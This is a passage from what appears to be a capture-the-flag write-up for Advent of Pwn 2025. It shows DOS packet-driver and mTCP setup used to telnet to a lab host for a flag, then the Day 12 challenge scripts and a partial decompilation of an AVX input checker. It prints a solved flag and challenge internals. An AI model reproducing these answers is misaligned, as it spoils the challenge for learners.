</pre></table></code></div></div><p><a href="/assets/img/AdventOfPwn2025/pic22.png" class="popup img-link normal shimmer"><img src="/assets/img/AdventOfPwn2025/pic22.png" alt="Desktop View" width="700" height="300" loading="lazy"></a></p><p>On this disk there is a directory <code class="language-plaintext highlighter-rouge">PKTDRVR</code> containing the packet driver</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nb">cd </span>PKTDRVR
DIR
</pre></table></code></div></div><p><a href="/assets/img/AdventOfPwn2025/pic23.png" class="popup img-link normal shimmer"><img src="/assets/img/AdventOfPwn2025/pic23.png" alt="Desktop View" width="700" height="300" loading="lazy"></a></p><p>We see a file like: <code class="language-plaintext highlighter-rouge">PCNTPK COM</code> which is the PCnet packet driver. Load driver for PCNet into DOS <a href="https://www.infania.net/misc/eprmhtml/epr3a/h8498.html">usage</a></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>PCNTPK <span class="nv">INT</span><span class="o">=</span>0x60
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">PCNTPK INT=0x60</code> starts the network driver for the PCNet card, making it a permanent program (TSR) and attaching it to software interrupt 0x60. From there, DOS programs like mTCP can use INT 0x60 to send/receive packets over the network card without needing to manually access the hardware.</p><p><a href="/assets/img/AdventOfPwn2025/pic24.png" class="popup img-link normal shimmer"><img src="/assets/img/AdventOfPwn2025/pic24.png" alt="Desktop View" width="700" height="300" loading="lazy"></a></p><h4 id="load-and-copy-mtcp-tools-to-c-and-configure-mtcpcfg"><span class="me-2">Load and copy <code class="language-plaintext highlighter-rouge">mtcp</code> tools to <code class="language-plaintext highlighter-rouge">C:</code> and configure <code class="language-plaintext highlighter-rouge">MTCPCFG</code></span><a href="#load-and-copy-mtcp-tools-to-c-and-configure-mtcpcfg" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Load and copy to <code class="language-plaintext highlighter-rouge">C:\MTCP</code> so that if we reboot, the files are still there.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>C:
MD MTCP
CD <span class="se">\M</span>TCP
COPY A:<span class="se">\*</span>.<span class="k">*</span> C:<span class="se">\M</span>TCP
</pre></table></code></div></div><p><a href="/assets/img/AdventOfPwn2025/pic25.png" class="popup img-link normal shimmer"><img src="/assets/img/AdventOfPwn2025/pic25.png" alt="Desktop View" width="700" height="300" loading="lazy"></a></p><p>Configure <code class="language-plaintext highlighter-rouge">MTCPCFG</code> file with <code class="language-plaintext highlighter-rouge">EDIT MTCPCFG</code> command.:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>PACKETINT 0x60
IPADDR 192.168.13.10   <span class="p">;</span> anything that isn<span class="s1">'t 37
NETMASK 255.255.255.0
GATEWAY 192.168.13.1
HOSTNAME DOSBOX
</span></pre></table></code></div></div><p><a href="/assets/img/AdventOfPwn2025/pic26.png" class="popup img-link normal shimmer"><img src="/assets/img/AdventOfPwn2025/pic26.png" alt="Desktop View" width="700" height="300" loading="lazy"></a></p><p>Then set the environment variable:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>SET <span class="nv">MTCPCFG</span><span class="o">=</span>C:<span class="se">\M</span>TCP<span class="se">\M</span>TCPCFG
</pre></table></code></div></div><h4 id="use-mtcps-telnetexe-to-connect-to-get-flag"><span class="me-2">Use mTCP‚Äôs <code class="language-plaintext highlighter-rouge">TELNET.EXE</code> to connect to get flag</span><a href="#use-mtcps-telnetexe-to-connect-to-get-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Run <code class="language-plaintext highlighter-rouge">telnet 192.168.13.37 1337</code> to connect.</p><p><a href="/assets/img/AdventOfPwn2025/pic27.png" class="popup img-link normal shimmer"><img src="/assets/img/AdventOfPwn2025/pic27.png" alt="Desktop View" width="700" height="300" loading="lazy"></a></p><p>Flag: <code class="language-plaintext highlighter-rouge">pwn.college{si3LNe3r3ZKte0r3FssuxokIS1k.0lM2EjMywiN1UDN0EzW}</code></p><hr /><h2 id="day12"><span class="me-2">Day12</span><a href="#day12" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><hr /><h3 id="description-11"><span class="me-2">Description</span><a href="#description-11" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Earlier this season, you pulled off a holiday miracle by helping Santa <strong>compute</strong> the legendary Naughty-or-Nice List‚Ñ¢ from scratch.<br /> With Christmas approaching, Santa sat down to perform his time-honored ritual:<br /> <strong>check the list once, then check it again.</strong></p><p>But this year, both checks led to the same unsettling result.</p><p>Instead of the tidy columns of names and verdicts he expected, Santa found the list filled with unreadable, unintelligible‚Ä¶ <em>stuff.</em><br /> Not names. Not classifications. Not even coal-worthy scribbles.<br /> Just sheer, bewildering nonsense.</p><p>The elves are whispering about misaligned enchantments.<br /> Rudolph blames a ‚Äúdata blizzard.‚Äù<br /> Santa insists he followed the procedure correctly, which only raises more questions.</p><p>One thing‚Äôs clear:</p><p>üéÖ <strong>The list you computed is there ‚Äî it‚Äôs just not making sense to anyone yet.</strong></p><p>Now it‚Äôs up to you to dig into the underlying structure, figure out what the list <em>should</em> say, and help Santa restore order before the sleigh leaves the hangar.</p><p>Because if Santa checks it a <em>third</em> time and it‚Äôs still nonsense‚Ä¶<br /> <strong>Christmas may get cancelled this year.</strong></p><p><strong>Only you can save Christmas!</strong></p><hr /><h3 id="analysis-11"><span class="me-2">Analysis</span><a href="#analysis-11" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><details> <summary>Click to view <code>checklist</code></summary><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="c">#!/bin/sh</span>
<span class="nb">set</span> <span class="nt">-eu</span>

<span class="k">for </span>path <span class="k">in</span> /challenge/naughty-or-nice/<span class="k">*</span><span class="p">;</span> <span class="k">do</span>
    <span class="o">[</span> <span class="nt">-f</span> <span class="s2">"</span><span class="nv">$path</span><span class="s2">"</span> <span class="o">]</span> <span class="o">||</span> <span class="k">continue
    </span><span class="nv">digest</span><span class="o">=</span><span class="si">$(</span><span class="nb">basename</span> <span class="s2">"</span><span class="nv">$path</span><span class="s2">"</span><span class="si">)</span>
    <span class="nv">input</span><span class="o">=</span><span class="s2">"/list/</span><span class="nv">$digest</span><span class="s2">"</span>

    <span class="k">if</span> <span class="o">[</span> <span class="o">!</span> <span class="nt">-f</span> <span class="s2">"</span><span class="nv">$input</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
        </span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$digest</span><span class="s2">: missing"</span>
        <span class="nb">exit </span>1
    <span class="k">fi

    if </span><span class="nv">output</span><span class="o">=</span><span class="si">$(</span><span class="s2">"</span><span class="nv">$path</span><span class="s2">"</span> &lt; <span class="s2">"</span><span class="nv">$input</span><span class="s2">"</span> 2&gt;&amp;1<span class="si">)</span><span class="p">;</span> <span class="k">then
        </span><span class="nb">cat</span> <span class="s2">"</span><span class="nv">$input</span><span class="s2">"</span>
    <span class="k">else
        </span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$digest</span><span class="s2">: </span><span class="nv">$output</span><span class="s2">"</span>
        <span class="nb">exit </span>1
    <span class="k">fi
done</span>
</pre></table></code></div></div></details> <details> <summary>Click to view <code>run</code></summary><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
</pre><td class="rouge-code"><pre><span class="c">#!/usr/bin/exec-suid -- /bin/bash -p</span>

<span class="nb">set</span> <span class="nt">-euo</span> pipefail
<span class="nb">umask </span>077

<span class="k">if</span> <span class="o">[</span> <span class="s2">"$#"</span> <span class="nt">-ne</span> 1 <span class="o">]</span><span class="p">;</span> <span class="k">then
    </span><span class="nb">echo</span> <span class="s2">"usage: </span><span class="nv">$0</span><span class="s2"> &lt;list&gt;"</span> <span class="o">&gt;</span>&amp;2
    <span class="nb">exit </span>1
<span class="k">fi

</span><span class="nv">LIST_SRC</span><span class="o">=</span><span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span>
<span class="k">if</span> <span class="o">[</span> <span class="o">!</span> <span class="nt">-d</span> <span class="s2">"</span><span class="nv">$LIST_SRC</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
    </span><span class="nb">echo</span> <span class="s2">"error: list must be a directory"</span> <span class="o">&gt;</span>&amp;2
    <span class="nb">exit </span>1
<span class="k">fi

</span><span class="nv">LOG_FILE</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">mktemp</span><span class="si">)</span><span class="s2">"</span>
cleanup<span class="o">()</span> <span class="o">{</span> <span class="nb">rm</span> <span class="nt">-f</span> <span class="s2">"</span><span class="nv">$LOG_FILE</span><span class="s2">"</span><span class="p">;</span> <span class="o">}</span>
<span class="nb">trap </span>cleanup EXIT

<span class="k">if</span> <span class="o">!</span> qemu-system-x86_64 <span class="se">\</span>
    <span class="nt">-machine</span> <span class="nv">accel</span><span class="o">=</span>tcg <span class="se">\</span>
    <span class="nt">-cpu</span> max <span class="se">\</span>
    <span class="nt">-m</span> 512M <span class="se">\</span>
    <span class="nt">-nographic</span> <span class="se">\</span>
    <span class="nt">-no-reboot</span> <span class="se">\</span>
    <span class="nt">-kernel</span> /boot/vmlinuz <span class="se">\</span>
    <span class="nt">-initrd</span> /boot/initramfs.cpio.gz <span class="se">\</span>
    <span class="nt">-append</span> <span class="s2">"console=ttyS0 quiet panic=-1 rdinit=/init"</span> <span class="se">\</span>
    <span class="nt">-fsdev</span> <span class="nb">local</span>,id<span class="o">=</span>list_fs,path<span class="o">=</span><span class="s2">"</span><span class="nv">$LIST_SRC</span><span class="s2">"</span>,security_model<span class="o">=</span>none <span class="se">\</span>
    <span class="nt">-device</span> virtio-9p-pci,fsdev<span class="o">=</span>list_fs,mount_tag<span class="o">=</span>list <span class="se">\</span>
    <span class="nt">-serial</span> stdio <span class="se">\</span>
    <span class="nt">-monitor</span> none | <span class="nb">tee</span> <span class="s2">"</span><span class="nv">$LOG_FILE</span><span class="s2">"</span><span class="p">;</span> <span class="k">then
    </span><span class="nb">echo</span> <span class="s2">"error: VM execution failed"</span> <span class="o">&gt;</span>&amp;2
    <span class="nb">exit </span>1
<span class="k">fi

if </span><span class="nb">grep</span> <span class="nt">-q</span> <span class="s2">"NAUGHTY"</span> <span class="s2">"</span><span class="nv">$LOG_FILE</span><span class="s2">"</span><span class="p">;</span> <span class="k">then
    </span><span class="nb">exit </span>1
<span class="k">fi

if</span> <span class="o">!</span> <span class="nb">grep</span> <span class="nt">-q</span> <span class="s2">"NICE"</span> <span class="s2">"</span><span class="nv">$LOG_FILE</span><span class="s2">"</span><span class="p">;</span> <span class="k">then
    </span><span class="nb">exit </span>1
<span class="k">fi

</span><span class="nb">cat</span> /flag
</pre></table></code></div></div></details><p>Overall, we‚Äôre given <code class="language-plaintext highlighter-rouge">checklist</code>, <code class="language-plaintext highlighter-rouge">run</code> and a folder <code class="language-plaintext highlighter-rouge">/challenge/naughty-or-nice/</code> containing 461 ELF files.</p><p><code class="language-plaintext highlighter-rouge">run</code> recieves parameter <code class="language-plaintext highlighter-rouge">$1</code> which is a directory path <code class="language-plaintext highlighter-rouge">$LIST_SRC</code> and mounts it to the QEMU VM with mount tag <code class="language-plaintext highlighter-rouge">list</code>. All output from the VM will be written to <code class="language-plaintext highlighter-rouge">$LOG_FILE</code>.</p><p>Win condition:</p><ul><li><code class="language-plaintext highlighter-rouge">grep -q "NAUGHTY" "$LOG_FILE"</code> If the log contains <code class="language-plaintext highlighter-rouge">NAUGHTY</code>, exit 1 (fail).<li><code class="language-plaintext highlighter-rouge">grep -q "NICE" "$LOG_FILE"</code> If the log <strong>does not</strong> contain <code class="language-plaintext highlighter-rouge">NICE</code>, exit 1 (fail).<li>If both conditions are passed: <code class="language-plaintext highlighter-rouge">cat /flag</code></ul><p><code class="language-plaintext highlighter-rouge">checklist</code> will be executed inside the VM:</p><ul><li>Interate through all files in <code class="language-plaintext highlighter-rouge">/challenge/naughty-or-nice/*</code> (These are executables files available in <code class="language-plaintext highlighter-rouge">/challenge/naughty-or-nice/</code>) and the filename is assigned to <code class="language-plaintext highlighter-rouge">digest</code>.<li>It searches for the corresponding input file in the <code class="language-plaintext highlighter-rouge">/list/</code> directory (this directory is the <code class="language-plaintext highlighter-rouge">$LIST_SRC</code> directory you provided on the host machine).</ul><p>For example: If it contains the binary <code class="language-plaintext highlighter-rouge">/challenge/naughty-or-nice/abc123</code>, it will search for the input file <code class="language-plaintext highlighter-rouge">/list/abc123</code>.</p><ul><li><code class="language-plaintext highlighter-rouge">$path" &lt; "$input</code>: It runs the binary <code class="language-plaintext highlighter-rouge">$path</code> and redirects the contents of your input file ($input) to that binary‚Äôs stdin.<li>If the binary runs successfully (exit code 0), it will output the contents of the input file. If fails, it prints the error along with the digest and exits with code 1.</ul><p>Let‚Äôs analyze one of the ELF files in <code class="language-plaintext highlighter-rouge">/challenge/naughty-or-nice/</code>. Overall, it read 0x100 bytes from stdin and using <code class="language-plaintext highlighter-rouge">AVX instructions</code> to performs a series of arithmetic calculations then compares each bytes of the transformation with a target constant. If all bytes match, it print our input and returns 0; otherwise, it returns -1.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
</pre><td class="rouge-code"><pre><span class="kt">void</span> <span class="n">__noreturn</span> <span class="nf">start</span><span class="p">()</span>
<span class="p">{</span>
<span class="err">¬†</span> <span class="kt">signed</span> <span class="n">__int64</span> <span class="n">v3314</span><span class="p">;</span> <span class="c1">// rax</span>
<span class="err">¬†</span> <span class="kt">signed</span> <span class="n">__int64</span> <span class="n">v3315</span><span class="p">;</span> <span class="c1">// rax</span>
<span class="err">¬†</span> <span class="kt">signed</span> <span class="n">__int64</span> <span class="n">v3316</span><span class="p">;</span> <span class="c1">// rax</span>
<span class="err">¬†</span> <span class="kt">signed</span> <span class="n">__int64</span> <span class="n">v3317</span><span class="p">;</span> <span class="c1">// rax</span>
<span class="err">¬†</span> <span class="n">__m256</span> <span class="n">buf</span><span class="p">;</span> <span class="c1">// [rsp+100h] [rbp-100h] BYREF</span>

<span class="err">¬†</span> <span class="n">_RAX</span> <span class="o">=</span> <span class="n">sys_read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x100u</span><span class="p">);</span>
<span class="err">¬†</span> <span class="kr">__asm</span>
<span class="err">¬†</span> <span class="p">{</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="n">vmovdqu</span> <span class="n">ymm0</span><span class="p">,</span> <span class="p">[</span><span class="n">rbp</span><span class="o">+</span><span class="n">var_20</span><span class="p">]</span>
    <span class="n">vmovdqu</span> <span class="n">ymm1</span><span class="p">,</span> <span class="n">cs</span><span class="o">:</span><span class="n">ymmword_416B49</span>
    <span class="n">vpsubb</span>  <span class="n">ymm2</span><span class="p">,</span> <span class="n">ymm0</span><span class="p">,</span> <span class="n">ymm1</span>
    <span class="n">vmovdqu</span> <span class="p">[</span><span class="n">rbp</span><span class="o">+</span><span class="n">var_20</span><span class="p">],</span> <span class="n">ymm2</span>
    <span class="n">vmovdqu</span> <span class="n">ymm0</span><span class="p">,</span> <span class="p">[</span><span class="n">rbp</span><span class="o">+</span><span class="n">var_E0</span><span class="p">]</span>
    <span class="n">vmovdqu</span> <span class="n">ymm1</span><span class="p">,</span> <span class="n">cs</span><span class="o">:</span><span class="n">ymmword_40B0AE</span><span class="o">+</span><span class="mi">3</span>
    <span class="n">vpaddb</span>  <span class="n">ymm2</span><span class="p">,</span> <span class="n">ymm0</span><span class="p">,</span> <span class="n">ymm1</span>
    <span class="n">vmovdqu</span> <span class="p">[</span><span class="n">rbp</span><span class="o">+</span><span class="n">var_E0</span><span class="p">],</span> <span class="n">ymm2</span>
    <span class="n">vmovdqu</span> <span class="n">ymm0</span><span class="p">,</span> <span class="p">[</span><span class="n">rbp</span><span class="o">+</span><span class="n">var_C0</span><span class="p">]</span>
    <span class="n">vmovdqu</span> <span class="n">ymm1</span><span class="p">,</span> <span class="n">cs</span><span class="o">:</span><span class="n">ymmword_4102A9</span>
    <span class="p">......</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="n">vpsubb</span>  <span class="n">ymm2</span><span class="p">,</span> <span class="n">ymm0</span><span class="p">,</span> <span class="n">ymm1</span>
    <span class="n">vmovdqu</span> <span class="p">[</span><span class="n">rbp</span><span class="o">+</span><span class="n">buf</span><span class="p">],</span> <span class="n">ymm2</span>
    <span class="n">vmovdqu</span> <span class="n">ymm0</span><span class="p">,</span> <span class="p">[</span><span class="n">rbp</span><span class="o">+</span><span class="n">buf</span><span class="p">]</span>
    <span class="n">vpcmpeqb</span> <span class="n">ymm1</span><span class="p">,</span> <span class="n">ymm0</span><span class="p">,</span> <span class="n">cs</span><span class="o">:</span><span class="n">ymmword_408080</span>
    <span class="n">vpmovmskb</span> <span class="n">eax</span><span class="p">,</span> <span class="n">ymm1</span>
<span class="err">¬†</span> <span class="p">}</span>
<span class="err">¬†</span> <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">_DWORD</span><span class="p">)</span><span class="n">_RAX</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span>
<span class="err">¬†</span> <span class="p">{</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="kr">__asm</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="p">{</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="n">vmovdqu</span> <span class="n">ymm0</span><span class="p">,</span> <span class="p">[</span><span class="n">rbp</span><span class="o">+</span><span class="n">var_E0</span><span class="p">]</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="n">vpcmpeqb</span> <span class="n">ymm1</span><span class="p">,</span> <span class="n">ymm0</span><span class="p">,</span> <span class="n">cs</span><span class="o">:</span><span class="n">ymmword_4080A0</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="n">vpmovmskb</span> <span class="n">eax</span><span class="p">,</span> <span class="n">ymm1</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="p">}</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="k">if</span> <span class="p">(</span> <span class="n">_EAX</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="p">{</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="kr">__asm</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="p">{</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="n">vmovdqu</span> <span class="n">ymm0</span><span class="p">,</span> <span class="p">[</span><span class="n">rbp</span><span class="o">+</span><span class="n">var_C0</span><span class="p">]</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="n">vpcmpeqb</span> <span class="n">ymm1</span><span class="p">,</span> <span class="n">ymm0</span><span class="p">,</span> <span class="n">cs</span><span class="o">:</span><span class="n">ymmword_4080C0</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="n">vpmovmskb</span> <span class="n">eax</span><span class="p">,</span> <span class="n">ymm1</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="p">}</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="k">if</span> <span class="p">(</span> <span class="n">_EAX</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="p">{</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="kr">__asm</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="p">{</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="n">vmovdqu</span> <span class="n">ymm0</span><span class="p">,</span> <span class="p">[</span><span class="n">rbp</span><span class="o">+</span><span class="n">var_A0</span><span class="p">]</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="n">vpcmpeqb</span> <span class="n">ymm1</span><span class="p">,</span> <span class="n">ymm0</span><span class="p">,</span> <span class="n">cs</span><span class="o">:</span><span class="n">ymmword_4080E0</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="n">vpmovmskb</span> <span class="n">eax</span><span class="p">,</span> <span class="n">ymm1</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="p">}</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="k">if</span> <span class="p">(</span> <span class="n">_EAX</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="p">{</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="kr">__asm</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="p">{</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="n">vmovdqu</span> <span class="n">ymm0</span><span class="p">,</span> <span class="p">[</span><span class="n">rbp</span><span class="o">+</span><span class="n">var_80</span><span class="p">]</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="n">vpcmpeqb</span> <span class="n">ymm1</span><span class="p">,</span> <span class="n">ymm0</span><span class="p">,</span> <span class="n">cs</span><span class="o">:</span><span class="n">ymmword_408100</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="n">vpmovmskb</span> <span class="n">eax</span><span class="p">,</span> <span class="n">ymm1</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="p">}</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="k">if</span> <span class="p">(</span> <span class="n">_EAX</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="p">{</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="kr">__asm</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="p">{</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="n">vmovdqu</span> <span class="n">ymm0</span><span class="p">,</span> <span class="p">[</span><span class="n">rbp</span><span class="o">+</span><span class="n">var_60</span><span class="p">]</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="n">vpcmpeqb</span> <span class="n">ymm1</span><span class="p">,</span> <span class="n">ymm0</span><span class="p">,</span> <span class="n">cs</span><span class="o">:</span><span class="n">ymmword_408120</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="n">vpmovmskb</span> <span class="n">eax</span><span class="p">,</span> <span class="n">ymm1</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="p">}</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="k">if</span> <span class="p">(</span> <span class="n">_EAX</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="p">{</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="kr">__asm</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="p">{</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="n">vmovdqu</span> <span class="n">ymm0</span><span class="p">,</span> <span class="p">[</span><span class="n">rbp</span><span class="o">+</span><span class="n">var_40</span><span class="p">]</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="n">vpcmpeqb</span> <span class="n">ymm1</span><span class="p">,</span> <span class="n">ymm0</span><span class="p">,</span> <span class="n">cs</span><span class="o">:</span><span class="n">ymmword_408140</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="n">vpmovmskb</span> <span class="n">eax</span><span class="p">,</span> <span class="n">ymm1</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="p">}</span>
